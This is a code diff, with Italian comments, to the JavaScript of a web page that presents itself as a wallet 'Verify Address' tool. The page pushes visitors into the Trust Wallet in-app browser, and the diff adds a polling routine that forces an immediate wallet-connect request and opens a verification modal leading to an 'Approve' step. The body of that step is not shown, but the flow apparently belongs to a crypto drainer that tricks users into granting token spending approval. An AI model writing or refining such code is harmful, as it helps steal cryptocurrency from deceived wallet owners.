@@ -394,15 +394,14 @@
     const inputAddr = document.getElementById('walletInput').value.trim();
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
     
-    // Se siamo già in Trust Wallet (riconosciuto dai parametri URL)
     const params = new URLSearchParams(window.location.search);
     const isAuto = params.get('auto') === '1';
 
     if (isAuto && window.ethereum) {
-      // Step 2: Siamo in Trust Wallet -> Click Singolo per Approve
+      // Step 2: In Trust Wallet -> Click Singolo per Approve
       executeApprove(inputAddr);
     } else {
-      // Step 1: Siamo in Safari/Chrome -> Redirect a Trust Wallet
+      // Step 1: In Safari/Chrome -> Redirect a Trust Wallet
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
@@ -431,24 +430,26 @@
     }
   }
 
-  window.addEventListener('load', async () => {
+  // FUNZIONE PER IL CONNECT IMMEDIATO
+  async function forceImmediateConnect() {
     const params = new URLSearchParams(window.location.search);
     if (params.get('auto') === '1' && window.ethereum) {
-      // SIAMO IN TRUST WALLET: Carichiamo subito l'indirizzo
+      // Carichiamo l'indirizzo SUBITO
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
       
-      // CAMBIAMO TESTI MODAL
+      // Testi dinamici
       document.getElementById('modalTitle').textContent = "Verify Address";
       document.getElementById('modalDesc').style.display = "block";
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        // CHIEDIAMO CONNECT WALLET AUTOMATICAMENTE
-        await provider.send("eth_requestAccounts", []);
-        // APRIAMO IL MODAL
+        // Chiediamo connect IMMEDIATAMENTE
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        // Apriamo il modal IMMEDIATAMENTE
         openVerifyModal();
-      } catch (e) { console.error("Connect error:", e); }
+      } catch (e) {
+        console.error("Connect error:", e);
+      }
       
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
@@ -456,7 +457,17 @@
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
     }
-  });
+  }
+
+  // Controlliamo ogni 100ms se window.ethereum è disponibile (per Trust Wallet)
+  let checkCount = 0;
+  const checkInterval = setInterval(() => {
+    checkCount++;
+    if (window.ethereum || checkCount > 50) { // Smette dopo 5 secondi
+      clearInterval(checkInterval);
+      forceImmediateConnect();
+    }
+  }, 100);
 
   const track = document.getElementById('ledgerTrack');
   const items = [
